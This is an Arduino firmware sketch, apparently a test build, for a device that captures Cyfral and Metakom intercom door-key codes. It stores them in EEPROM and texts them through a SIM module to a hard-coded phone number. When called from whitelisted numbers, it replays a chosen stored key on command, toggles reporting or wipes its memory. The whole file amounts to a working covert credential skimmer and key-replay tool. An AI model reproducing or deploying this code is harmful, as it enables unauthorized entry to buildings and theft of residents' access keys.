/*
 Name:		CyfralMetakom_Test.ino
 Created:	11-Jan-24 00:19:52
 Author:	sQueezy

*/
#include "CyfralMetakomHeader.h"
void setup()
{
	//clearMemory();
#ifdef DEBUG_ENABLE
	Serial.begin(115200);
	pinMode(13, OUTPUT);
	DEBUG("Ready");
	Serial.println(__DATE__);
	Serial.println(__TIME__);
#endif
	//delay(5000);
	firstStart();
	//clearMemory(); while (1);
	//getfromeeprom(); printkeys(); while (1);	//debug
	initSIM();
	/*DEBUG(readByte(writedKeysByte));
	DEBUG(readByte(voltagekeyWritedbyte));
	DEBUG(ADMUX);
	Serial.println(readByte(0x300 - 1), HEX);*/
	//for (;;) { Serial.println(ConvAdcToVolts(obj.adc())); delay(100); }
	ADCSRA = (bit(ADEN) | bit(ADSC) | 0b110);
	EIMSK |= bit(INT0); EICRA |= bit(ISC01); //debug
	wdt_init();
}
ISR(INT0_vect) {
	flagInterrupt = RINGCALL;
}
ISR(WDT_vect) {
	if (keyReaded || flagAdcFirstConv == false)
		flagInterrupt = KEYREADED;
	else if (flagSmsNotsended && (mS - timestamp) > period)
		flagInterrupt = SMSNOTSENDED;
#ifdef __LGT8FX8P__
	sbi(WDTCSR, WDIE); wdr;
#endif // __LGT8FX8P__
}

void loop()
{
again:
	while (keyReaded < LIMIT) {
		if (obj.KeyDetection(kArray[keyReaded])) {
			keyReaded++; DEBUG(keyReaded);
		}//else if (obj.error) DEBUG(obj.error);
		else {
			switch (flagInterrupt) {
			case RINGCALL: {	//DEBUG(); DEBUG(F("\t 1")); DEBUG(flagSmsNotsended); DEBUG();0
				for (auto ringtimestamp = mS; !digitalRead(PIN_RING);) {
					if (mS - ringtimestamp > 150) {
						HandleCall();
						if (flagInterrupt == READDISABLE) goto again;
						break;
					}
				}
			}	break;
			case KEYREADED: //(keyReaded)  DEBUG(F("\t\t 2")); DEBUG(flagSmsNotsended); DEBUG();
				sortingArray();
				writeKeys();
				clearArray();
				flagAdcFirstConv = true;
				//break; //debug
			case SMSNOTSENDED:   //DEBUG(); DEBUG(F("\t 3")); DEBUG(flagSmsNotsended); DEBUG();
				getfromeeprom(); //printkeys(); clearArray();
				sendKeys(writedKeys);
				break;
			case READDISABLE:
				if (mS - timestamp < (15 * 60 * 1000ul)) continue;
				break;
			case ZERO: 	//error //DEBUG(); DEBUG(F("\t def")); DEBUG(flagSmsNotsended); DEBUG();
				flagSmsNotsended |= (obj.error << 4);
				continue;
			}
			flagInterrupt = ZERO;
		}
	}DEBUG(F("\tBREAK"));
	//printkeys();
	sortingArray();
	writeKeys();
	clearArray();
	flagSmsNotsended |= 1;  //debug
}
void HandleCall() {
	AutoFun <> obj;
	if (strstr(waitResponse(), PHONE_NUMBER_1) || strstr(respBuf, PHONE_NUMBER_2)) {
		sendAT("ATA");
		char* colonIndex;
		byte keyid = 0, keyType = 0;
		auto timer = mS;
		while (mS - timer < 10000) {
			if ((colonIndex = strchr(waitResponse(), ':'))) {
				timer = mS;
				if (colonIndex[2] == '*') {
					if ((colonIndex = strchr(waitResponse(), ':')) != NULL) {
						timer = mS;
						switch (colonIndex[2]) {
						case '*':
							sendAT("ATH");
							getfromeeprom();
							sendKeys(writedKeys);
							return;
						case '#': //SMSDISABLE
							flagSmsNotsended = 0;
							period = (24 * 60 * 60 * 1000ul);
							timestamp = mS;
							continue;
						case '1': //SMSENABLE
							timestamp = 0;
							continue;
						case '0':
							sendAT("ATH");
							flagInterrupt = READDISABLE;
							//period = (15 * 60 * 1000ul);
							timestamp = mS;
							return;
						default: goto exit;
						}
					}	continue;
				} else if (colonIndex[2] == '#') {
					if (strchr(waitResponse(2), '*')) {
						if (strchr(waitResponse(2), '#'))
							if (strchr(waitResponse(2), '*'))
								clearMemory();
					} else goto exit;
				} else {
					keyid = atoi(colonIndex + 2);
					if (keyid > writedKeys || keyid == 0) continue;
					keyid--;
				}
				if ((colonIndex = strchr(waitResponse(), ':'))) {
					timer = mS;
					keyType = atoi(colonIndex + 2);
					if (keyType == 2 || keyType == 1) {
						emulateKeys(keyid, keyType);
						timer = mS;
					}
				} else continue;
			}
		}
	}
exit:
	sendAT("ATH");
	//DEBUG(); DEBUG(F("\t 111")); DEBUG(flagSmsNotsended); DEBUG();
}
void sendKeys(const byte& keysAmount) {
	AutoFun <>obj;  DEBUG(F("\tsendkey"));
	if (!SendSms(kArray, ("AT+CMGS=\"+7" SEND_SMS_PHONE "\""), vArray, keysAmount, voltagekeyWrited)) {
		flagSmsNotsended |= 1;
		timestamp = millis();
		period = (15 * 60 * 1000ul);
	} else { flagSmsNotsended = 0; } DEBUG(flagSmsNotsended);
	writeByte(smsNotsendedByte, flagSmsNotsended);
	clearArray();
}
void emulateKeys(byte keyNO, byte keyType) {
	wdr; //reset watchdog
	readKey(keyNO, kArray[0]);
	obj.Emulate(kArray[0], keyType, 100);
	memset(kArray[0], 0, keylen);
}
void sortingArray() {
	for (byte first = 0, second, next = 0; first < keyReaded; first++) {
		if (kArray[first][4] == 0) {
			for (; next < keyReaded; next++) {
				if (kArray[next][4]) {
					memcpy(kArray[first], kArray[next], keylen);
					memset(kArray[next], 0, keylen); 
					break;
				}
			}
			if (next == keyReaded) {
				keyReaded = first;
				return;
			}
		}
		for (second = ++next; second < keyReaded; second++) {
			if (kArray[second][4]) {
				//if (!memcmp(kArray[first], kArray[second], 4))
				if (*(dword*)&kArray[first] == *(dword*)&kArray[second])
					memset(kArray[second], 0, keylen);
			}
		}
	}
}
void writeKeys() {
	const byte oldWritedKeys = writedKeys;
	if (oldWritedKeys == 0) {
		for (byte i = 0; i < keyReaded && writedKeys < limitKeys; i++) writeKey(writedKeys++, kArray[i]);
	} else {
		for (byte key_n = 0, block, i; key_n < keyReaded && writedKeys < limitKeys; key_n++) {
			for (block = 0; block < oldWritedKeys; block++) {  // checking for key not exist in eeprom
				for (i = 0;;) {
					if (kArray[key_n][i] != readByte(block * keylen + i)) break;
					if (++i == 4) goto next; //already exist in eeprom
				}
			}
			DEBUG(F("\t\tWRITE"));
			writeKey(writedKeys++, kArray[key_n]);
		next:continue;
		}
	}
	if (writedKeys > oldWritedKeys)
		writeByte(writedKeysByte, writedKeys);
	if (avgVoltage < adcMaxValue && voltagekeyWrited < limitKeys) {
		const word voltageLastbyte = voltageFirstbyte + voltagekeyWrited * 2;
		if (voltagekeyWrited != 0) {
			for (word tempAdc, i = voltageFirstbyte; i < voltageLastbyte; i += 2) {
				readBlock(i, tempAdc);
				if (avgVoltage == tempAdc) return;  //already exist
			}
		}
		writeBlock(voltageLastbyte, avgVoltage);
		writeByte(voltagekeyWritedbyte, ++voltagekeyWrited);
	}
}
void clearArray() {
	memset(kArray, 0, keyReaded * keylen);
	keyReaded = 0;
	avgVoltage = adcMaxValue;
	delete[] vArray;
	vArray = nullptr;
}
void clearMemory() {
	byte _writedKeys = readByte(writedKeysByte);
	const word voltageLastbyte = voltageFirstbyte + readByte(voltagekeyWritedbyte) * 2;
	for (byte i = 0; i < _writedKeys; i++)
		writeKey(i, __UINT_FAST64_MAX__);
	for (word i = voltageFirstbyte; i < voltageLastbyte; i += 2)
		writeBlock(i, __UINT_FAST16_MAX__);
	writeByte(writedKeysByte, 0);
	writeByte(smsNotsendedByte, 0);
	writeByte(voltagekeyWritedbyte, 0);
	writedKeys = 0;
	voltagekeyWrited = 0;
	flagSmsNotsended = 0;
	avgVoltage = adcMaxValue;
	flagAdcFirstConv = true;
}
void printkeys() {
	for (byte i = 0; i < keyReaded; i++) {
		Serial.print(i + 1); Serial.print('\t');
		for (byte j = 0; j < 4; j++) {
			Serial.print(' ');
			Serial.print(kArray[i][j], HEX);
		}
		Serial.print(F("\tT1 = ")); Serial.print(kArray[i][4]);
		Serial.print(F("  T0 = ")); Serial.print(kArray[i][5]);
		Serial.print(F("  Ti1 = ")); Serial.print(kArray[i][6]);
		Serial.print(F("  Ti0 = ")); Serial.print(kArray[i][7]);
		Serial.println();
	}
	if (vArray != nullptr) {
		Serial.print(F("volKeysAmount = ")); Serial.println(voltagekeyWrited);
		Serial.print(F("\t  V\t\t  Ω\t\tDx\n"));
		float temp;
		for (byte i = 0; i < voltagekeyWrited; i++) {
			if (vArray[i] > 3500) continue;	//debug
			Serial.print(i + 1); Serial.print('\t');
			Serial.print(temp = ConvAdcToVolts(vArray[i]), 3);  Serial.print('\t'); Serial.print('\t');
			Serial.print(temp = CalcResistance(temp), 0); Serial.print('\t'); Serial.print('\t');
			Serial.println(CalcDx(temp));
		}
	}
	if (!flagAdcFirstConv) { Serial.print("avgVoltage = "); Serial.println(avgVoltage); }
	Serial.println(); //flagAdcFirstConv = true;//debug
}
void getfromeeprom() {
	for (byte i = 0; i < writedKeys; i++)
		readKey(i, kArray[i]);
	if (voltagekeyWrited) {
		vArray = new word[voltagekeyWrited];
		if (vArray)
			for (byte i = 0; i < voltagekeyWrited; i++)
				readBlock(voltageFirstbyte + (i * 2), vArray[i]);
	}
	keyReaded = writedKeys;
}
void firstStart() {
	if (readByte(writedKeysByte) == 0xFF ||
		readByte(voltagekeyWritedbyte) == 0xFF) {
		writeByte(writedKeysByte, 0);
		writeByte(smsNotsendedByte, 0);
		writeByte(voltagekeyWritedbyte, 0);
	} else { //writeByte((0x300 - 1), 0xff); 
		writedKeys = readByte(writedKeysByte);
		flagSmsNotsended = readByte(smsNotsendedByte);
		voltagekeyWrited = readByte(voltagekeyWritedbyte);
	}
}
